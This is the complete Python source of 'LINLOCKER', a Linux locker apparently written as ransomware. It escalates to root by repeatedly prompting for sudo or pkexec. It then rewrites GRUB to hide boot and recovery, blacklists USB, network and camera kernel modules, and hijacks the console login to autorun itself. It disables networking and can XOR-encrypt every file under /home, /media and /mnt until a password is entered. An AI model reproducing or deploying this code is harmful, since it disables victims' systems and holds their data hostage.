# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 09.02.2026
# APP: LINLOCKER
# TYPE: OS_LOCKER
# VERSION: LATEST
# PLATFORM: linux


#
#-
#--
#---
#----
#-----
#------
PASSWORD = '' # HERE IS LINLOCKER PASSWORD
ENCRYPTION = False # RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
MSG = '''
 ####      ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
  ##        ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
  ##        ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
  ##        ##     ## ####   ##      ##   ##  ##        ####     ####     #####
  ##   #    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
  ##  ##    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 #######   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#




import os
from sys import exit as _exit, platform, executable
from subprocess import run as sp_run, DEVNULL
from shutil import move as move_file
from hashlib import sha256
from glob import glob


PATH = '/etc/linlocker'
FILE_LINLOCKER = os.path.join(PATH, 'linlocker')
FILE_FLAG = os.path.join(PATH, '._')

OS_RELEASE = '/etc/os-release'
GRUB = '/etc/default/grub'
MODPROBE = '/etc/modprobe.d/linlocker.conf'
GETTY = '/etc/systemd/system/getty@.service.d'
OVERRIDE_CONF = os.path.join(GETTY, 'override.conf')
USERS = glob('/home/*')

ENCRYPTION_PATH = USERS + glob('/media/*') + glob('/mnt/*')
ENCRYPTION_MARK = b'\0-_-\0'
KEY = (0, 1)

IS_ROOT = os.getuid() == 0
SUDO = 'pkexec' if os.environ.get('DISPLAY', False) else 'sudo'

ID = 'default'


def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')


def get_distribution():
    if not os.path.isfile(OS_RELEASE):
        return 'default'
    
    with open(OS_RELEASE, 'r') as f:
        for n in f:
            n = n.strip().replace('"', '').lower()

            if n.startswith('id='):
                return n[3:]

    return 'default'


def cmd(c):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL).returncode
    except:
        return -1
    

def get_root():
    while cmd([SUDO, executable, __file__]) != 0: ...
    _exit(0)


def update_grub():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-grub'])
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'void'}:
        if cmd(['update-grub']) == 0:
            return 
        
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    else:
        for n in (
            ['update-grub'],
            ['grub-mkconfig', '-o', '/boot/grub/grub.cfg'],
            ['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'],
        ):
            if cmd(n) == 0:
                return 


def update_initramfs():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-initramfs', '-u', '-k', 'all']) 
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['mkinitcpio', '-P'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['dracut', '--force']) 
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['mkinitrd'])
    elif ID in {'void'}:
        cmd(['xbps-reconfigure', '-fa'])
    else:
        for n in (
            ['update-initramfs', '-u', '-k', 'all'],
            ['mkinitcpio', '-P'],
            ['dracut', '--force'],
            ['mkinitrd'],
        ):
            if cmd(n) == 0:
                return 


def generate_password(password, length):
    hash_bytes = sha256(password.encode()).digest()
    return (hash_bytes * ((length // len(hash_bytes)) + 1))[:length]


def enc(data):
    k0 = KEY[0]
    k1 = KEY[1]

    data = bytearray(data)
    ptr = memoryview(data)

    for (i, b) in enumerate(ptr):
        x = b ^ (((k1 + k0) + i) & 0xFF)
        k0 = (k0 ^ x) & 0xFF
        ptr[i] = x

    return bytes(ptr)


def encrypt_file(path):
    path_tmp = os.path.join('/tmp', f'.{hex(abs(hash(path)))}')

    try:
        with \
            open(path, 'rb') as f_in, \
            open(path_tmp, 'wb') as f_out \
        :
            if f_in.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                print(path, 'ok!')
                return
            
            f_in.seek(0, os.SEEK_SET)
            f_out.write(ENCRYPTION_MARK)

            while True:
                chunk = f_in.read(65536)

                if not chunk:
                    break

                f_out.write(enc(chunk))

        os.replace(path_tmp, path)
    except:
        print(path, 'no!')
    else:
        print(path, 'ok!')


def encrypt(root_path):
    for root, _, files in os.walk(root_path, topdown=False):
        for n in files:
            fp = os.path.join(root, n)
            encrypt_file(fp)
      

def destroy():
    cmd(['rm', '-rf', PATH])

    with open(GRUB, 'w') as f:
        f.write('''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_DISTRIBUTOR=Linux
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
''')
        
    if os.path.isfile(MODPROBE):
        os.remove(MODPROBE)
    
    if os.path.isfile(OVERRIDE_CONF):
        os.remove(OVERRIDE_CONF)
    
    update_grub()
    update_initramfs()
    cmd(['systemctl', 'set-default', 'graphical.target'])
    cmd(['systemctl', 'enable', 'NetworkManager'])

    if ENCRYPTION:
        for n in USERS:
            try:
                with open(os.path.join(n, 'requirement.txt'), 'w') as f:
                    f.write(MSG)
            except:
                continue

    cmd(['reboot'])
    _exit(0)
    

def welcome():
    sp_run('clear', shell=True)
    
    print(MSG)

    try:
        password = input('PASSWORD: ').strip()
    except EOFError:
        return

    if password == PASSWORD:
        sp_run('clear', shell=True)
        print('Your system has been restored')
        sp_run('sleep 3', shell=True)

        destroy()
    elif password == 'exit':
        cmd(['poweroff'])
        _exit(0)
        

def shell():
    sp_run('clear', shell=True)

    if ENCRYPTION:
        for n in ENCRYPTION_PATH:
            try: 
                encrypt(n)
            except:
                print(n, 'no!')
                continue

    while True:
        try:
            welcome()
        except: 
            continue


def init():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)

    if not os.path.isfile(FILE_LINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_LINLOCKER)
    
    with open(GRUB, 'w') as f:
        f.write('''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_RECOVERY=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_DISTRIBUTOR=LINLOCKER
GRUB_CMDLINE_LINUX_DEFAULT="quiet nosplash audit=0 loglevel=0 rd.udev.log_level=0 systemd.show_status=0 systemd.confirm_spawn=0 systemd.unit=multi-user.target"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
''')
    
    with open(MODPROBE, 'w') as f:
        f.write('''# USB & Storage     
install usbcore /bin/false
install uas /bin/false
install usb_storage /bin/false
install cdc_acm /bin/false
install mmc_block /bin/false
install ehci_hcd /bin/false
install xhci_hcd /bin/false
install ohci_hcd /bin/false
install fuse /bin/false       
install nbd /bin/false 
# Wireless & Network
install ath10k_pci /bin/false
install btbcm /bin/false
install orinoco /bin/false
install prism2_usb /bin/false
install ath9k /bin/false
install b43 /bin/false
install e1000e /bin/false
install iwlwifi /bin/false
install r8169 /bin/false
install brcmsmac /bin/false
install rtl8188eu /bin/false
install rtl8192cu /bin/false
install bnep /bin/false
install bluetooth /bin/false
install btusb /bin/false
install rfcomm /bin/false
install cdc_ether /bin/false
install usbnet /bin/false
install tun /bin/false
install tap /bin/false
install veth /bin/false
install macvlan /bin/false
install dummy /bin/false
install bridge /bin/false
# Audio
install snd_hda_intel /bin/false
install snd_hda_codec_hdmi /bin/false
install snd_soc_sst_broadwell /bin/false
install snd_sof_pci /bin/false
install snd_usb_audio /bin/false
# Video & Camera
install gspca_main /bin/false
install gspca_v4l /bin/false
install uvcvideo /bin/false
''')
        
    if not os.path.isdir(GETTY):
        os.mkdir(GETTY)
        
    with open(OVERRIDE_CONF, 'w') as f:
        f.write(f'''[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin root %I $TERM      
ExecStart=          
ExecStart="{executable}" "{FILE_LINLOCKER}"                       
Restart=always
RestartSec=1
''')
        
    update_grub()
    update_initramfs()
    cmd(['systemctl', 'set-default', 'multi-user.target'])
    cmd(['systemctl', 'enable', 'getty.target'])
    cmd(['systemctl', 'disable', 'NetworkManager'])
    with open(FILE_FLAG, 'w') as f: ...
    cmd(['reboot'])


def main():
    global KEY, ID

    invalid_type('PASSWORD', PASSWORD, str)
    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    if not os.path.isfile(GRUB):
        print(f'DO NOT SUPPORT ({platform})')
        _exit(1)

    not IS_ROOT and get_root()

    KEY = generate_password(PASSWORD, 2)

    for n in (
        ['stty', 'intr', 'undef'],
        ['stty', 'quit', 'undef'],
        ['stty', 'susp', 'undef'],
        ['stty', 'ixon', 'off'],
        ['stty', 'ixoff', 'off'],
        ['stty', 'echo', 'off'],
        ['stty', 'echoctl', 'off']
    ):
        cmd(n)

    ID = get_distribution()

    (shell if os.path.isfile(FILE_FLAG) else init)()
    _exit(0)


if __name__ == '__main__': main()